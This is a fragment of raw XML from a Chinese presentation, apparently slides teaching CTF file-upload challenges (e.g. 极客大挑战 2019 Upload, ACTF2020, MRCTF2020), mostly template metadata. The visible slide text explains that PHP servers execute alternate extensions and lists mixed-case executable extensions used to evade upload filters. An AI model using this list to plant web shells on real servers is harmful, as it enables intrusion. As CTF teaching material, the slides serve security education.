            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>例如phtml php3 php4 php5 PHP phtm这些后缀名服务器都支持将其解析为php脚本运行。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="文本框 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="154940" y="1596390"/>
            <a:ext cx="6096000" cy="2861310"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>   php 服务器可以把其他后缀的文件解析后可作为代码运行。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>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985770" y="3106420"/>
            <a:ext cx="6096000" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>[极客大挑战 2019]Upload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="文本框 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2985770" y="4095115"/>
            <a:ext cx="6096000" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>[ACTF2020 新生赛]Upload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>1</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2922270" y="5083810"/>
            <a:ext cx="6096000" cy="645160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>[MRCTF2020]你传你🐎呢</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>   .</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>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p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_UNIT_DEFAULT_FONT" val="54;80;2"/>
  <p:tag name="KSO_WM_UNIT_BLOCK" val="0"/>
  <p:tag name="KSO_WM_UNIT_DEC_AREA_ID" val="56e8ed5a7b1c43c7894be4ed930a69ca"/>
  <p:tag name="KSO_WM_UNIT_ISCONTENTSTITLE" val="0"/>
  <p:tag name="KSO_WM_UNIT_ISNUMDGMTITLE" val="0"/>
  <p:tag name="KSO_WM_UNIT_PRESET_TEXT" val="市场营销策划方案"/>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hip20219846_1*a*1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="chip"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20219846"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_SM_LIMIT_TYPE" val="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610372f7c82c9984180eace8"/>
  <p:tag name="KSO_WM_CHIP_XID" val="610372f7c82c9984180eace9"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag22.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_UNIT_DEFAULT_FONT" val="18;20;2"/>
  <p:tag name="KSO_WM_UNIT_BLOCK" val="0"/>
  <p:tag name="KSO_WM_UNIT_DEC_AREA_ID" val="eddd2c92b6994a4d8d8f6629f5fc1c27"/>
  <p:tag name="KSO_WM_UNIT_SUBTYPE" val="e"/>
  <p:tag name="KSO_WM_UNIT_PRESET_TEXT" val="202X"/>
  <p:tag name="KSO_WM_UNIT_NOCLEAR" val="0"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="3"/>
  <p:tag name="KSO_WM_UNIT_HIGHLIGHT" val="0"/>
  <p:tag name="KSO_WM_UNIT_COMPATIBLE" val="0"/>
  <p:tag name="KSO_WM_UNIT_DIAGRAM_ISNUMVISUAL" val="0"/>
  <p:tag name="KSO_WM_UNIT_DIAGRAM_ISREFERUNIT" val="0"/>
  <p:tag name="KSO_WM_UNIT_TYPE" val="f"/>
  <p:tag name="KSO_WM_UNIT_INDEX" val="1"/>
  <p:tag name="KSO_WM_UNIT_ID" val="chip20219846_1*f*1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="chip"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20219846"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_SM_LIMIT_TYPE" val="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610372f7c82c9984180eace8"/>
  <p:tag name="KSO_WM_CHIP_XID" val="610372f7c82c9984180eace9"/>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14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15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16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8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20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1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1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7.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_TEMPLATE_THUMBS_INDEX" val="1、4、7、9、12、16、21、24、25、26、27、30、35、39、42、43"/>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11"/>
  <p:tag name="KSO_WM_TEMPLATE_MASTER_TYPE" val="1"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag218.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_UNIT_DEFAULT_FONT" val="54;80;2"/>
  <p:tag name="KSO_WM_UNIT_BLOCK" val="0"/>
  <p:tag name="KSO_WM_UNIT_DEC_AREA_ID" val="56e8ed5a7b1c43c7894be4ed930a69ca"/>
  <p:tag name="KSO_WM_UNIT_ISCONTENTSTITLE" val="0"/>
  <p:tag name="KSO_WM_UNIT_ISNUMDGMTITLE" val="0"/>
  <p:tag name="KSO_WM_UNIT_PRESET_TEXT" val="市场营销策划方案"/>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hip20219846_1*a*1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="chip"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20219846"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_SM_LIMIT_TYPE" val="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610372f7c82c9984180eace8"/>
  <p:tag name="KSO_WM_CHIP_XID" val="610372f7c82c9984180eace9"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag219.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_TEMPLATE_THUMBS_INDEX" val="1、4、7、9、12、16、21、24、25、26、27、30、35、39、42、43"/>
  <p:tag name="KSO_WM_SLIDE_ID" val="custom20204411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4411"/>
  <p:tag name="KSO_WM_SLIDE_LAYOUT" val="a_b"/>
  <p:tag name="KSO_WM_SLIDE_LAYOUT_CNT" val="1_3"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag22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BLOCK" val="0"/>
  <p:tag name="KSO_WM_UNIT_DEC_AREA_ID" val="25136182e3114f46b6c3ca0cac3854a7"/>
  <p:tag name="KSO_WM_UNIT_SM_LIMIT_TYPE" val="2"/>
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5fd07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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7415_1*i*1"/>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e7ff1980d3894a1bb6fd46b57ff4aee9"/>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CHIP_GROUPID" val="5fd07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX" val="5"/>
  <p:tag name="KSO_WM_UNIT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="224"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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7415_1*i*2"/>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152d74ec4eb043c9b7eeb03a601026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d07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="-0.15"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX" val="14"/>
  <p:tag name="KSO_WM_UNIT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="375"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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7415_1*i*3"/>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9de46e294f0b4ff889a48b926d08a45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d07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX" val="14"/>
  <p:tag name="KSO_WM_UNIT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="1025"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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7415_1*i*4"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20217415"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_BLOCK" val="0"/>
  <p:tag name="KSO_WM_UNIT_SM_LIMIT_TYPE" val="0"/>
  <p:tag name="KSO_WM_UNIT_DEC_AREA_ID" val="4f8a1ad478674136b0b1e41bbbd2b30e"/>
  <p:tag name="KSO_WM_UNIT_DECORATE_INFO" val="{&quot;DecorateInfoH&quot;:{&quot;IsAbs&quot;:true},&quot;DecorateInfoW&quot;:{&quot;IsAbs&quot;:true},&quot;DecorateInfoX&quot;:{&quot;IsAbs&quot;:true,&quot;Pos&quot;:2},&quot;DecorateInfoY&quot;:{&quot;IsAbs&quot;:true,&quot;Pos&quot;:1},&quot;ReferentInfo&quot;:{&quot;Id&quot;:&quot;70956f1434594d558c6b1f1426150a6b&quot;,&quot;X&quot;:{&quot;Pos&quot;:0},&quot;Y&quot;:{&quot;Pos&quot;:1}},&quot;whChangeMode&quot;:0}"/>
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5fd07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX" val="5"/>
  <p:tag name="KSO_WM_UNIT_LINE_FILL_TYPE" val="2"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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7415_1*i*5"/>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eb7b6ca658a34279bbc42f7c8b40caf6"/>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CHIP_GROUPID" val="5fd07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="-0.25"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX" val="14"/>
  <p:tag name="KSO_WM_UNIT_LINE_FILL_TYPE" val="2"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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7415_1*i*6"/>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3847023d678945158392fbbdf7ce4e7f"/>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CHIP_GROUPID" val="5fd07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="-0.25"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX" val="14"/>
  <p:tag name="KSO_WM_UNIT_LINE_FILL_TYPE" val="2"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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415_1*f*1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20217415"/>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70956f1434594d558c6b1f1426150a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67f987923fa2419986fae3f909b0cae1"/>
  <p:tag name="KSO_WM_UNIT_SUPPORT_BIG_FONT" val="1"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0.25"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX" val="13"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag257.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20217415"/>
  <p:tag name="KSO_WM_SLIDE_ID" val="diagram20217415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SLIDE_LAYOUT" val="f"/>
  <p:tag name="KSO_WM_SLIDE_LAYOUT_CNT" val="1"/>
  <p:tag name="KSO_WM_SLIDE_RATIO" val="1.777778"/>
  <p:tag name="KSO_WM_CHIP_INFOS" val="{&quot;type&quot;:0,&quot;layout_type&quot;:&quot;full&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7de04d383dce34166709"/>
  <p:tag name="KSO_WM_CHIP_FILLPROP" val="[[{&quot;text_align&quot;:&quot;lm&quot;,&quot;text_direction&quot;:&quot;horizontal&quot;,&quot;support_big_font&quot;:true,&quot;picture_toward&quot;:0,&quot;picture_dockside&quot;:[],&quot;fill_id&quot;:&quot;29d18f7ffd4745349d5fbab5978f6e7b&quot;,&quot;fill_align&quot;:&quot;lm&quot;,&quot;chip_types&quot;:[&quot;text&quot;,&quot;header&quot;]}]]"/>
  <p:tag name="KSO_WM_CHIP_DECFILLPROP" val="[]"/>
  <p:tag name="KSO_WM_SLIDE_CAN_ADD_NAVIGATION" val="1"/>
  <p:tag name="KSO_WM_SLIDE_BACKGROUND" val="[&quot;general&quot;]"/>
  <p:tag name="KSO_WM_SLIDE_LAYOUT_INFO" val="{&quot;backgroundInfo&quot;:[{&quot;bottom&quot;:0,&quot;bottomAbs&quot;:false,&quot;left&quot;:0,&quot;leftAbs&quot;:false,&quot;right&quot;:0,&quot;rightAbs&quot;:false,&quot;top&quot;:0,&quot;topAbs&quot;:false,&quot;type&quot;:&quot;general&quot;}],&quot;direction&quot;:1,&quot;id&quot;:&quot;2021-04-01T16:20:58&quot;,&quot;maxSize&quot;:{&quot;size1&quot;:63.8},&quot;minSize&quot;:{&quot;size1&quot;:63.8},&quot;normalSize&quot;:{&quot;size1&quot;:63.8},&quot;subLayout&quot;:[{&quot;id&quot;:&quot;2021-04-01T16:20:58&quot;,&quot;margin&quot;:{&quot;bottom&quot;:4.2330002784729,&quot;left&quot;:3.809999942779541,&quot;right&quot;:0.02600000612437725,&quot;top&quot;:4.2330002784729},&quot;type&quot;:0},{&quot;id&quot;:&quot;2021-04-01T16:20:58&quot;,&quot;type&quot;:0}],&quot;type&quot;:0}"/>
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5fd07de04d383dce34166708"/>
  <p:tag name="KSO_WM_SLIDE_BACKGROUND_TYPE" val="general"/>
  <p:tag name="KSO_WM_SLIDE_SUPPORT_FEATURE_TYPE" val="0"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag258.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="custom"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20204411"/>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wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203671"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag261.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203671"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag26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6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671_1*i*1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203671"/>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671_1*i*2"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203671"/>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9.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_UNIT_ISCONTENTS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03671_1*a*1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203671"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_PRESET_TEXT" val="单击此处添加标题"/>
  <p:tag name="KSO_WM_UNIT_ISNUMDGMTITLE" val="0"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX" val="14"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_TYPE" val="1"/>
</p:tagLst>
</file>

<file path=ppt/tags/tag270.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_UNIT_NOCLEAR" val="0"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="1144"/>
  <p:tag name="KSO_WM_UNIT_HIGHLIGHT" val="0"/>
  <p:tag name="KSO_WM_UNIT_COMPATIBLE" val="0"/>
  <p:tag name="KSO_WM_UNIT_DIAGRAM_ISNUMVISUAL" val="0"/>
  <p:tag name="KSO_WM_UNIT_DIAGRAM_ISREFERUNIT" val="0"/>
  <p:tag name="KSO_WM_UNIT_TYPE" val="f"/>
  <p:tag name="KSO_WM_UNIT_INDEX" val="1"/>
  <p:tag name="KSO_WM_UNIT_ID" val="diagram20203671_1*f*1"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203671"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_PRESET_TEXT" val="单击此处添加文本具体内容，简明扼要地阐述你的观点。&#13;单击此处添加文本具体内容，简明扼要地阐述你的观点。&#13;单击此处添加文本具体内容，简明扼要地阐述你的观点。&#13;单击此处添加文本具体内容，简明扼要地阐述你的观点。&#13;单击此处添加文本具体内容，简明扼要地阐述你的观点。"/>
  <p:tag name="KSO_WM_UNIT_SUBTYPE" val="a"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0.15"/>
  <p:tag name="KSO_WM_UNIT_TEXT_FILL_FORE_SCHEMECOLOR_INDEX" val="13"/>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671_1*i*3"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203671"/>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671_1*i*4"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203671"/>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3.xml><?xml version="1.0" encoding="utf-8"?>
<p:tagLst xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
  <p:tag name="KSO_WM_SLIDE_ID" val="diagram2020367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95*464"/>
  <p:tag name="KSO_WM_SLIDE_POSITION" val="32*36"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20203671"/>
  <p:tag name="KSO_WM_SLIDE_LAYOUT" val="a_f"/>
  <p:tag name="KSO_WM_SLIDE_LAYOUT_CNT" val="1_1"/>
  <p:tag name="KSO_WM_SLIDE_BACKGROUND_TYPE" val="gener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7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BLOCK" val="0"/>
  <p:tag name="KSO_WM_UNIT_DEC_AREA_ID" val="25136182e3114f46b6c3ca0cac3854a7"/>
  <p:tag name="KSO_WM_UNIT_SM_LIMIT_TYPE" val="2"/>
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5fd07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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7415_1**"/>
  <p:tag name="KSO_WM_TEMPLATE_CATEGORY" val="diagram"/>
  <p:tag name="KSO_WM_TEMPLATE_INDEX" val="20217415"/>
  <p:tag name="KSO_WM_UNIT_LAYERLEVEL" val="1"/>
  <p:tag name="KSO_WM_TAG_VERSION" val="1.0"/>
  <p:tag name="KSO_WM_BEAUTIFY_FLAG" val="#wm#"/>
  <p:tag name="KSO_WM_UNIT_SM_LIMIT_TYPE" val="2"/>
  <p:tag name="KSO_WM_CHIP_GROUPID" val="5fd07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="-0.05"/>
  <p:tag name="KSO_WM_UNIT_LINE_FORE_SCHEMECOLOR_INDEX" val="14"/>
  <p:tag name="KSO_WM_UNIT_LINE_FILL_TYPE" val="2"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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7415_1*i*1"/>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e7ff1980d3894a1bb6fd46b57ff4aee9"/>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CHIP_GROUPID" val="5fd07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="0"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX" val="5"/>
  <p:tag name="KSO_WM_UNIT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="224"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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7415_1*i*2"/>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152d74ec4eb043c9b7eeb03a601026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d07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX_BRIGHTNESS" val="-0.15"/>
  <p:tag name="KSO_WM_UNIT_FILL_FORE_SCHEMECOLOR_INDEX" val="14"/>
  <p:tag name="KSO_WM_UNIT_FILL_TYPE" val="1"/>
  <p:tag name="KSO_WM_UNIT_VALUE" val="375"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_XID" val="606570804054ed1e2fb8168e"/>
  <p:tag name="KSO_WM_TEMPLATE_ASSEMBLE_GROUPID" val="606570804054ed1e2fb8168e"/>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7415_1*i*3"/>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9de46e294f0b4ff889a48b926d08a45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d07de04d383dce34166708"/>
  <p:tag name="KSO_WM_CHIP_XID" val="5fd07de04d383dce34166709"/>
